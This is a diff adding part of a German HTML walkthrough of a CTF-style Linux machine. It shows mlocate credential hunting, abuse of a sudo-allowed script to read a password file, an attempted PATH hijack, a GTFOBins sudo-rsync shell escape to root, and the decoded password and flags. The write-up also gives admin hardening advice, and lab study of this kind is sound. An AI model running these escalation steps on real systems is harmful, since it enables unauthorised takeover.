+                <br><strong>Empfehlung (Admin):</strong> Setzen Sie den `PATH` in Skripten, die mit erhöhten Rechten ausgeführt werden, immer explizit auf sichere Systempfade (z.B. `PATH=/usr/sbin:/sbin:/usr/bin:/bin`). Verwenden Sie vollständige Pfade zu Binaries (`/usr/bin/diff` anstelle von `diff`). Überprüfen Sie Skripte auf unsichere Nutzung von Benutzereingaben oder temporären Dateien. Stellen Sie sicher, dass Skripte, die mit `sudo` ausgeführt werden, nur für Root schreibbar sind.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">ls -la /opt/sync.sh</span></div>
+                    <pre><span class="command">-rwxr-xr-x 1 root root 385 May 16 01:39 /opt/sync.sh</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich überprüfte die Berechtigungen des `/opt/sync.sh` Skripts selbst. Die Ausgabe zeigte, dass die Datei Root gehört und für Root les- und schreibbar ist, aber für andere (einschließlich `welcome`) nur les- und ausführbar (`-rwxr-xr-x`). Dies bestätigte, dass ich das Skript selbst als `welcome` nicht manipulieren konnte. Die Ausnutzung musste über die PATH-Hijacking-Schwachstelle im Skript erfolgen, wenn ich es mit `sudo` als `sabulaji` ausführe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die korrekten Berechtigungen für das Skript selbst bestätigten, dass die Schwachstelle nicht in den Dateirechten lag, sondern in der unsicheren Implementierung des Skripts (`diff`-Aufruf ohne sicheren PATH).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie Berechtigungen von Skripten, die mit `sudo` ausgeführt werden dürfen. Wenn Sie das Skript nicht schreiben können, suchen Sie nach anderen Schwachstellen im Skript selbst oder im Ausführungskontext.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte, die mit erhöhten Rechten ausgeführt werden, nur für Root schreibbar sind.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">cd /tmp</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">echo "/bin/bash" > diff</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">chmod +x diff</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">touch /tmp/test</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich bereitete die Ausnutzung der PATH-Hijacking-Schwachstelle im `/opt/sync.sh` Skript vor. Ich wechselte in das `/tmp` Verzeichnis, das für `welcome` schreibbar war. Dort erstellte ich ein neues Skript namens `diff` (`echo "/bin/bash" > diff`), das einfach `/bin/bash` ausführt. Ich machte dieses Skript ausführbar (`chmod +x diff`). Dann erstellte ich eine leere Datei namens `test` (`touch /tmp/test`), die ich als Argument an `/opt/sync.sh` übergeben würde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Vorbereitung des schädlichen `diff`-Skripts im `/tmp` Verzeichnis war entscheidend. Da `/tmp` oft im standardmäßigen Benutzer-PATH enthalten ist (oder durch Manipulation des PATHs priorisiert werden kann) und schreibbar ist, kann ich hier ein Skript platzieren, das vor dem echten `/usr/bin/diff` gefunden wird. Wenn `/opt/sync.sh` dann `diff` ohne vollständigen Pfad aufruft und ich den PATH so manipulieren kann, dass `/tmp` zuerst durchsucht wird, wird mein schädliches Skript als Benutzer `sabulaji` ausgeführt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie PATH-Hijacking ausnutzen, erstellen Sie Ihr schädliches Binary/Skript an einem schreibbaren Ort (wie `/tmp`). Benennen Sie es genauso wie das anfällige Kommando im Skript. Stellen Sie sicher, dass Ihr schädliches Skript ausführbar ist und das gewünschte Kommando ausführt (hier `/bin/bash`).
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie temporäre Verzeichnisse mit `noexec`. Überwachen Sie die Erstellung von ausführbaren Dateien in temporären Verzeichnissen.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">sudo -u sabulaji PATH=/tmp:$PATH /opt/sync.sh /tmp/test</span></div>
+                    <pre><span class="password">sudo: sorry, you are not allowed to set the following environment variables: PATH</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich versuchte, das `/opt/sync.sh` Skript mit manipuliertem PATH auszuführen. Der Befehl `sudo -u sabulaji PATH=/tmp:$PATH /opt/sync.sh /tmp/test` sollte das Skript als Benutzer `sabulaji` ausführen (`-u sabulaji`), den PATH so setzen, dass `/tmp` zuerst durchsucht wird (`PATH=/tmp:$PATH`), und `/tmp/test` als Argument übergeben. Der Versuch schlug jedoch fehl. Die Fehlermeldung `sudo: sorry, you are not allowed to set the following environment variables: PATH` zeigte, dass die `sudo` Konfiguration es mir nicht erlaubte, die Umgebungsvariable `PATH` zu setzen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Scheitern dieses Versuchs zeigte, dass die `sudo` Konfiguration standardmäßig verhindert, dass Benutzer bestimmte Umgebungsvariablen setzen, wenn sie `sudo` verwenden. Dies ist eine gängige Härtungsmaßnahme gegen PATH-Hijacking. Ich musste eine andere Methode finden, um sicherzustellen, dass mein schädliches `diff`-Skript im PATH gefunden wird, ohne den PATH selbst über `sudo` zu setzen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beachten Sie `sudo` Einschränkungen beim Setzen von Umgebungsvariablen. Suchen Sie nach alternativen Methoden, um den PATH zu beeinflussen (z.B. durch das Platzieren des Skripts in einem Verzeichnis, das standardmäßig im PATH des Zielbenutzers liegt und vor den Systempfaden durchsucht wird).
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Umgebungsvariablen, die Benutzer mit `sudo` setzen dürfen (`env_keep`, `env_reset`). Stellen Sie sicher, dass `PATH` nicht manipuliert werden kann.
+
+             </p>
+
+             <p class="analysis">
+                Ich war Mitglied der Gruppe `mlocate`, wie durch meinen `id`-Befehl als `welcome` bestätigt wurde. Die Gruppe `mlocate` hat typischerweise Leseberechtigungen für die mlocate-Datenbank (`/var/lib/mlocate/mlocate.db`). Diese Datenbank enthält einen Index aller Dateien auf dem System und kann manchmal sensible Dateinamen oder Pfade preisgeben, die sonst schwer zu finden wären. Ich suchte nach der mlocate-Datenbankdatei und las ihren Inhalt mit `strings` aus, um lesbaren Text zu extrahieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die `mlocate.db` Datenbank ist eine wertvolle Informationsquelle, die Dateipfade enthalten kann, die mir auf andere Weise verborgen bleiben würden. Das Auslesen dieser Datenbank war ein logischer Schritt, um nach weiteren Hinweisen oder sensiblen Dateien zu suchen, die mir helfen könnten, mich zu `sabulaji` oder `root` zu eskalieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie Mitglied der Gruppe `mlocate` sind, lesen Sie die mlocate-Datenbank aus (`/var/lib/mlocate/mlocate.db`) und durchsuchen Sie sie nach interessanten Dateinamen oder Pfaden.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die mlocate-Datenbank (`/var/lib/mlocate/mlocate.db`) nur für die notwendigen Benutzer lesbar ist.
+
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">find / -name mlocate* 2>/dev/null</span></div>
+                    <pre><span class="command">/usr/include/mlocate</span>
+<span class="command">...</span>
+<span class="command">..</span>
+<span class="password">/var/lib/mlocate/mlocate.db</span>
+<span class="command">...</span>
+<span class="command">..</span></pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">strings /var/lib/mlocate/mlocate.db | grep '/home/sabulaji'</span></div>
+                    <pre><span class="password">/home/sabulaji</span>
+<span class="password">/home/sabulaji/personal</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich las den Inhalt der mlocate-Datenbank aus und filterte die Ausgabe mit `grep '/home/sabulaji'`, um alle Zeilen zu finden, die Pfade unter dem Home-Verzeichnis von `sabulaji` enthielten. Die Ausgabe bestätigte die Existenz des Verzeichnisses `/home/sabulaji` und des Unterverzeichnisses `/home/sabulaji/personal`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies bestätigte Pfade, die mir helfen könnten, Dateien zu finden, auf die `sabulaji` zugreift oder die ihm gehören. Das `/home/sabulaji/personal` Verzeichnis schien besonders interessant.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie `mlocate.db`, um Pfade zu interessanten Verzeichnissen oder Dateien zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die mlocate-Datenbank nicht sensitive Dateinamen oder Pfade preisgibt, die auf versteckte Bereiche hindeuten könnten.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">strings /var/lib/mlocate/mlocate.db | grep -E 'cr.*.txt'</span></div>
+                    <pre><span class="password">creds.txt</span>
+<span class="password">pi_getscript.txt</span>
+<span class="password">scroll.txt</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich durchsuchte die mlocate-Datenbank weiter nach Dateinamen, die auf Zugangsdaten oder interessante Skripte hindeuten könnten, indem ich die Ausgabe von `strings` durch `grep -E 'cr.*.txt'` filterte. Dieser reguläre Ausdruck suchte nach Dateinamen, die mit "cr" beginnen und mit ".txt" enden, was auf Dateien wie "creds.txt" (Credentials) hindeuten könnte. Die Ausgabe zeigte die Dateinamen `creds.txt`, `pi_getscript.txt` und `scroll.txt`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden von `creds.txt` in der mlocate-Datenbank ist ein sehr starker Hinweis auf eine Datei, die Zugangsdaten enthalten könnte. Die anderen Dateinamen klingen ebenfalls potenziell interessant. Ich musste nun versuchen, den genauen Pfad zu `creds.txt` zu finden und diese Datei auszulesen, um die Zugangsdaten zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie reguläre Ausdrücke mit `grep` beim Durchsuchen von Datenbanken oder großen Textdateien nach interessanten Mustern oder Dateinamen (z.B. `pass`, `cred`, `key`, `secret`).
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sensible Dateinamen nicht in der mlocate-Datenbank oder anderen Systemindizes erscheinen, die für unprivilegierte Benutzer lesbar sind.
+             </p>
+
+             <p class="analysis">
+                Ich vermutete, dass die Datei `creds.txt` in `/home/sabulaji/personal/` lag, basierend auf der vorherigen `mlocate.db` Ausgabe. Ich nutzte die `sudo -u sabulaji /opt/sync.sh` Schwachstelle erneut, um den Inhalt von `/home/sabulaji/personal/creds.txt` auszulesen. Das Skript `/opt/sync.sh` verwendet den `diff`-Befehl auf die übergebene Datei und `/home/sabulaji/personal/notes.txt` und gibt den Unterschied aus. Ich übergab `/home/sabulaji/personal/creds.txt` als Argument an `/opt/sync.sh` und führte es als `sabulaji` aus. Das Skript verglich `creds.txt` mit `notes.txt` und gab den Unterschied aus.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe des `diff`-Befehls zeigte den Inhalt von `creds.txt`. Am Ende der Ausgabe stand `Sensitive Credentials:Z2FzcGFyaW4=`. Der String `Z2FzcGFyaW4=` sah wie ein Base64-kodierter String aus. Dies war der entscheidende Hinweis auf Zugangsdaten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie jede Schwachstelle maximal aus, um Informationen zu extrahieren. Wenn Sie Code ausführen können, lesen Sie Dateien aus. Analysieren Sie die Ausgabe von Skripten genau, auch wenn sie Fehler oder Unterschiede anzeigen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte keine sensiblen Informationen preisgeben, selbst wenn sie mit begrenzten Rechten ausgeführt werden.
+
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">sudo -u sabulaji /opt/sync.sh /home/sabulaj*/personal/creds.txt</span></div>
+                    <pre><span class="command">Difference: 1,27c1</span>
+<span class="command">< root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">< daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="command">< bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="command">< sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="command">< sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="command">< games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="command">< man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="command">< lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="command">< mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="command">< news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="command">< uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="command">< proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="command">< www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="command">< backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="command">< list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="command">< irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
+<span class="command">< gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
+<span class="command">< nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="command">< _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">< systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span>
+<span class="command">< systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span>
+<span class="command">< systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span>
+<span class="command">< systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span>
+<span class="command">< messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">< sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="command">< welcome:x:1000:1000:,,,:/home/welcome:/bin/bash</span>
+<span class="command">< sabulaji:x:1001:1001::/home/sabulaji:/bin/bash</span>
+<span class="command">---</span>
+<span class="password">> Sensitive Credentials:Z2FzcGFyaW4=</span>
+<span class="command">[+] Updated.</span></pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">echo "Z2FzcGFyaW4=" | base64 -d</span></div>
+                    <pre><span class="password">gasparin</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich dekodierte den Base64-String `Z2FzcGFyaW4=` mit dem Befehl `echo "Z2FzcGFyaW4=" | base64 -d`. Das Ergebnis war die Zeichenkette `gasparin`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das dekodierte Wort `gasparin` war offensichtlich das Passwort für den Benutzer `sabulaji`. Dies ist ein kritischer Fund und ermöglicht mir nun, mich als Benutzer `sabulaji` anzumelden. Dies ist der nächste Schritt in der Privilegieneskalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dekodieren Sie alle verdächtigen Base64-Strings. Sie enthalten oft sensible Informationen wie Passwörter.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten in Klartext oder einfach kodierter Form auf Systemen.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">welcome@Sabulaji:/tmp$ <span class="command">su sabulaji</span></div>
+                    <pre><span class="command">Password: gasparin</span>
+<span class="prompt">sabulaji@Sabulaji:/tmp$</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Mit dem gefundenen Passwort versuchte ich, die Benutzeridentität auf der `welcome` Shell zu `sabulaji` zu wechseln. Ich verwendete den Befehl `su sabulaji` und gab das Passwort `gasparin` ein. Nach erfolgreicher Authentifizierung erhielt ich eine Shell als Benutzer `sabulaji`. Ich machte einen kurzen Tippfehler und versuchte es erneut, was dann funktionierte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Ich habe die Privilegieneskalation von `welcome` zu `sabulaji` erreicht, indem ich das gefundene Passwort nutzte. Ich habe nun Zugriff als ein weiterer regulärer Benutzer, der wahrscheinlich höhere Berechtigungen als `welcome` hat und das nächste Ziel vor `root` darstellt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie gefundene Passwörter sofort, um sich an der Shell anzumelden (`su`) oder per SSH.
+                <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke Passwörter. Überwachen Sie Login-Versuche.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sabulaji@Sabulaji:/tmp$ <span class="command">sudo -l</span></div>
+                    <pre><span class="command">Matching Defaults entries for sabulaji on Sabulaji:</span>
+<span class="command">    env_reset, mail_badpass,</span>
+<span class="command">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">User sabulaji may run the following commands on Sabulaji:</span>
+<span class="password">    (ALL) NOPASSWD: /usr/bin/rsync</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Als Benutzer `sabulaji` prüfte ich sofort meine `sudo`-Berechtigungen mit `sudo -l`. Die Ausgabe zeigte eine sehr interessante Regel: `(ALL) NOPASSWD: /usr/bin/rsync`. Dies bedeutete, dass der Benutzer `sabulaji` das Programm `/usr/bin/rsync` als *jeder* Benutzer (`ALL`), einschließlich `root`, ausführen darf, ohne ein Passwort einzugeben (`NOPASSWD`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist der direkte Weg zur Root-Privilegieneskalation! Eine `NOPASSWD` Regel für `rsync` ist eine hochgradig ausnutzbare Schwachstelle. Ich darf `rsync` mit Root-Berechtigungen ausführen, ohne ein Passwort zu benötigen. Rsync hat Funktionen, die das Ausführen von Shell-Befehlen ermöglichen, wenn es als Server oder im Kontext der Remote Shell ausgeführt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer die `sudo`-Berechtigungen. `NOPASSWD` Regeln für Programme wie `rsync` sind oft direkt über GTFOBins ausnutzbar. Nutzen Sie diese, um eine Root-Shell zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Weisen Sie `NOPASSWD` Berechtigungen nur mit äußerster Vorsicht zu. Überprüfen Sie Ihre `sudoers`-Datei auf unsichere Einträge, insbesondere für Dateisynchronisierungs- oder Übertragungstools.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">[Link: https://gtfobins.github.io/gtfobins/rsync/#sudo | Ziel: https://gtfobins.github.io/gtfobins/rsync/#sudo]</span>
+<span class="command">Sudo</span>
+
+<span class="command">If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access</span>
+
+<span class="command">sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich konsultierte GTFOBins ([Link: https://gtfobins.github.io/gtfobins/rsync/#sudo | Ziel: https://gtfobins.github.io/gtfobins/rsync/#sudo]), um eine Methode zur Ausnutzung von `sudo rsync` zu finden. Die Website bietet eine spezifische Anleitung dafür. Die empfohlene Methode nutzt die `-e` Option von rsync, die ein Remote Shell Programm angibt. Man kann hier `sh -c "sh 0<&2 1>&2"` einfügen, um eine interaktive Shell zu erhalten. Der Befehl lautete `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> GTFOBins lieferte den exakten Befehl, um die `sudo rsync` Schwachstelle zur Erlangung einer Root-Shell auszunutzen. Diese Methode ist bekannt und zuverlässig.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie GTFOBins, um die Ausnutzung von SUID-Binaries oder `sudo`-anfälligen Programmen zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die auf GTFOBins gelisteten Binaries auf Ihren Systemen.
+
+             </p>
+
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die erfolgreiche Erlangung vollständiger Root-Privilegien auf dem Zielsystem durch die Ausnutzung einer Fehlkonfiguration in der `sudoers`-Datei. Der Benutzer `sabulaji` war berechtigt, das Programm `/usr/bin/rsync` ohne Passwort als Root auszuführen. Durch die Nutzung der `-e` Option von rsync konnte eine interaktive Root-Shell erlangt werden.
+            </p>
+             <p class="analysis">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugriff als Benutzer `sabulaji`.</li>
+                    <li>Die `sudoers`-Datei muss den Eintrag `sabulaji ALL=(ALL) NOPASSWD: /usr/bin/rsync` enthalten.</li>
+                    <li>Das Programm `/usr/bin/rsync` muss auf dem System installiert sein.</li>
+                </ul>
+            </p>
+             <p class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung & Beweismittel:</strong>
+            </p>
+             <p class="analysis">
+                1. Überprüfung der `sudo`-Berechtigungen des Benutzers `sabulaji`:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sabulaji@Sabulaji:/tmp$ <span class="command">sudo -l</span></div>
+                    <pre><span class="command">...</span>
+<span class="command">User sabulaji may run the following commands on Sabulaji:</span>
+<span class="password">    (ALL) NOPASSWD: /usr/bin/rsync</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Als Benutzer `sabulaji` wurde festgestellt, dass `/usr/bin/rsync` ohne Passwort als Root ausgeführt werden darf.
+            </p>
+             <p class="analysis">
+                2. Ausführung von `rsync` mit manipuliertem Remote Shell Parameter zur Erlangung einer Root-Shell:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sabulaji@Sabulaji:/tmp$ <span class="command">sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null</span></div>
+                    <pre><span class="prompt">#</span> <span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="prompt">#</span> <span class="command">ls</span>
+<span class="command">diff</span>
+<span class="command">systemd-private-fa8e89c99b04486a86a15620aacc1c17-apache2.service-dkEkqi</span>
+<span class="command">systemd-private-fa8e89c99b04486a86a15620aacc1c17-systemd-logind.service-1GUNAf</span>
+<span class="command">systemd-private-fa8e89c99b04486a86a15620aacc1c17-systemd-timesyncd.service-3BtRdj</span>
+<span class="command">test</span>
+<span class="prompt">#</span> <span class="command">cd ~</span>
+<span class="prompt">#</span> <span class="command">ls</span>
+<span class="password">root.txt</span>
+<span class="prompt">#</span> <span class="command">cat root.txt</span>
+<span class="password">flag{root-89e62d8807f7986edb259eb2237d011c}</span>
+<span class="prompt">#</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich führte den von GTFOBins bereitgestellten Befehl `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null` aus. Dieser Befehl nutzte die `sudo` Berechtigung, um rsync als Root auszuführen, und injizierte über die `-e` Option einen Bash-Befehl, der eine interaktive Shell initiierte. Ich erhielt sofort eine Root-Shell, erkennbar an der Eingabeaufforderung `#`. Innerhalb dieser Shell verifizierte ich meine Identität mit `id` (was `uid=0(root)` zeigte) und navigierte in das Home-Verzeichnis von Root (`cd ~`), um die Root Flag (`root.txt`) zu finden und auszulesen. Fantastisch der root zugriff war erfolgreich nun haben wir unser Ziel erreicht.
+            </p>
+
+             <p class="analysis">
+                <strong>Erwartetes Ergebnis:</strong> Erlangung einer interaktiven Shell mit Root-Berechtigungen auf dem Zielsystem.
+            </p>
+             <p class="analysis">
+                <strong>Tatsächliches Ergebnis:</strong> Eine interaktive Root-Shell wurde durch die Ausnutzung der `sudo rsync` Schwachstelle erlangt, was die vollständige Kompromittierung des Systems ermöglichte und den Zugriff auf die Root Flag erlaubte.
+            </p>
+
+            <p class="analysis">
+                <strong>Risikobewertung:</strong>
+                <br><strong>Auswirkung:</strong> Kritisch. Ein unprivilegierter Benutzer (`sabulaji`) konnte durch die Ausnutzung einer unsicheren `sudo`-Berechtigung vollständige administrative Kontrolle über das System erlangen.
+                <br><strong>Wahrscheinlichkeit:</strong> Hoch. Die Schwachstelle war direkt über einen vorhandenen `sudo`-Eintrag ausnutzbar und erforderte nur die Anwendung einer bekannten Ausnutzungstechnik für `rsync`.
+                <br><strong>Gesamtrisiko:</strong> Kritisch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlungen:</strong>
+                <br><strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li><strong>Dringend:</strong> Entfernen Sie den `NOPASSWD`-Eintrag für `/usr/bin/rsync` aus der `sudoers`-Datei.</li>
+                    <li>Überprüfen Sie alle `sudoers`-Einträge auf ähnliche Fehlkonfigurationen, insbesondere für Binaries, die Shell-Escapes oder Befehlsausführung erlauben.</li>
+                    <li>Wenden Sie das Prinzip der minimalen Rechte strikt an.</li>
+                    <li>Führen Sie regelmäßige Audits Ihrer `sudoers`-Konfiguration und der Berechtigungen von System-Binaries durch.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/welcome/user.txt</div>
+                    <div class="flag-value"><span class="password">flag{user-cf7883184194add6adfa5f20b5061ac7}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">flag{root-89e62d8807f7986edb259eb2237d011c}</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. Juni 2025</p>
+    </footer>
+</body>
+</html>
